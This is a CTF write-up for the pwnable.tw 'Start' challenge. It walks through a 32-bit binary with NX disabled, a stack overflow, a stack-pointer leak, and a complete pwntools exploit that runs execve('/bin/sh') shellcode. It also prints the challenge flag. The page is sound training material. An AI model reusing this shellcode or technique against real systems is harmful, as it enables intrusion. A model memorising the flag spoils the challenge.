---
layout: page
title: "Start"
major_type: Platform
parent_group: pwnable.tw
summary: "Introduction to pwnable.tw: Leaking a stack pointer to execute shellcode on the stack via ret2shellcode."
---

**Flag:** `FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`

## Binary Analysis

First, we analyze the binary's basic properties and protections using `file` and `checksec`.

```bash
$ file start
start: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), statically linked, not stripped

$ checksec start
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

The binary is a very small (564 bytes) 32-bit statically linked executable with almost all binary protections disabled. The lack of NX (No-eXecute) means we can execute shellcode placed on the stack. The lack of PIE and Stack Canary makes buffer overflows trivial to exploit.

## Static Analysis

Disassembling `_start` in `gdb` reveals a minimal program containing only two routines: `_start` and `_exit`.

```nasm
0x8048060 <_start>:    push   esp
0x8048061 <_start+1>:  push   0x804809d      ; push address of _exit
0x8048066 <_start+6>:  xor    eax,eax
0x8048068 <_start+8>:  xor    ebx,ebx
0x804806a <_start+10>: xor    ecx,ecx
0x804806c <_start+12>: xor    edx,edx
0x804806e <_start+14>: push   0x3a465443     ; "CTF:"
0x8048073 <_start+19>: push   0x20656874     ; "the "
0x8048078 <_start+24>: push   0x20747261     ; "art "
0x804807d <_start+29>: push   0x74732073     ; "s st"
0x8048082 <_start+34>: push   0x2774654c     ; "Let'"
0x8048087 <_start+39>: mov    ecx,esp        ; ecx points to the string
0x8048089 <_start+41>: mov    dl,0x14        ; length = 20
0x804808b <_start+43>: mov    bl,0x1         ; fd = stdout
0x804808d <_start+45>: mov    al,0x4         ; sys_write
0x804808f <_start+47>: int    0x80           ; write(1, "Let's start the CTF:", 20)
0x8048091 <_start+49>: xor    ebx,ebx        ; fd = stdin
0x8048093 <_start+51>: mov    dl,0x3c        ; length = 60
0x8048095 <_start+53>: mov    al,0x3         ; sys_read
0x8048097 <_start+55>: int    0x80           ; read(0, esp, 60)
0x8048099 <_start+57>: add    esp,0x14       ; clean up the string from stack
0x804809c <_start+60>: ret                   ; jump to return address
```

1. The program pushes the string `"Let's start the CTF:"` onto the stack in chunks (20 bytes total).
2. It calls `sys_write` to print the string to `stdout`.
3. It calls `sys_read` to read up to 60 bytes into the stack buffer starting at `esp`.
4. After reading, it adds `0x14` (20 bytes) to `esp`, effectively bypassing the string we printed, and executes `ret`. The address it returns to is the `_exit` address pushed at `0x8048061`.

## The Vulnerability

Since we can read 60 bytes but the buffer is only 20 bytes away from the return address, we have a classic buffer overflow. We need `20` bytes of padding to overwrite the return address. This leaves us `60 - 24 = 36` bytes for our shellcode on the stack, which is plenty for a `/bin/sh` execve payload.

## Stack Analysis (ESP Dynamics)

By analyzing the stack in `gdb` during execution, we can see exactly how the stack shifts:

1. **Initial State:** Upon entry to `_start`, the first instruction `push esp` pushes the original stack pointer to the stack. This saved pointer is crucial for our leak later.
2. **String Push:** Pushing `"Let's start the CTF:"` moves `esp` down by 20 bytes (`0x14`). 
3. **The Overflow:** When `sys_read` occurs, it writes to `esp`. If we write 20 bytes of 'A's, we fill the space meant for the string. The next 4 bytes we write will overwrite the return address (`_exit` pushed at `_start+1`).
4. **The Pivot:** After `sys_read`, the program executes `add esp, 0x14` effectively removing the string from the stack, and then hits `ret`. The `ret` instruction pops the overridden return address into `EIP`.

## Exploitation

### Stage 1: Stack Leak
Since ASLR is likely enabled on the remote server and the stack address changes, we cannot jump to our shellcode directly. We need a stack leak first.

We can overwrite the return address with the address of the `sys_write` call within the binary itself (`0x08048087`), creating a small ROP chain.

```python
leak_gadget = 0x08048087
payload  = b'A' * 20
payload += p32(leak_gadget)
```

When `ret` is executed, it jumps back to `mov ecx, esp`. Because `ret` popped the return address off the stack, `esp` now points to the original saved stack pointer (which was pushed at `0x8048060` with `push esp`). The `write` syscall will leak 20 bytes from the stack including this stack address, and then the program will execute `sys_read` again, waiting for a second payload!

### Stage 2: Shellcode Execution

From the leaked 20 bytes, the first 4 bytes are our leaked stack pointer. Because `sys_read` will be called again with this leaked `esp` as the buffer, we can calculate exactly where our shellcode will land. 

We overwrite the return address again, this time pointing it to `esp + 0x14` (which is right after the return address itself), followed by our shellcode.

#### Shellcode Breakdown
The 25-byte shellcode used executes `execve("/bin/sh", NULL, NULL)`. It is built as follows:
```nasm
xor eax, eax       ; Clear eax
push eax           ; Null terminator for string
push 0x68732f2f    ; "hs//"
push 0x6e69622f    ; "nib/"
mov ebx, esp       ; ebx = pointer to "/bin//sh"
push eax           ; Push NULL
push ebx           ; Push pointer to "/bin//sh"
mov ecx, esp       ; ecx = pointer to array [pointer to string, NULL]
xor edx, edx       ; edx = NULL
mov al, 0xb        ; syscall number for execve (11)
int 0x80           ; Execute syscall
```

```python
shellcode_addr = esp + 0x14
payload  = b'A' * 20
payload += p32(shellcode_addr)
payload += shellcode
```

### Final Exploit Script

```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'

# p = process('./start')
p = remote('chall.pwnable.tw', 10000)

# 25-byte execve("/bin/sh") shellcode
shellcode  = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
shellcode += b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
shellcode += b"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

# Receive initial banner
p.recvuntil(b'CTF:')

# Stage 1 - Leak stack
leak_gadget = 0x08048087

payload  = b'A' * 20
payload += p32(leak_gadget)

p.send(payload)

# Receive leaked ESP
leak = p.recv(20)
esp = u32(leak[:4])

log.success(f'Leaked ESP: {hex(esp)}')

# Shellcode will be located right after the RET address
shellcode_addr = esp + 0x14
log.info(f'Shellcode addr: {hex(shellcode_addr)}')

# Stage 2 - Execute shellcode
payload  = b'A' * 20
payload += p32(shellcode_addr)
payload += shellcode

p.send(payload)

p.interactive()
```
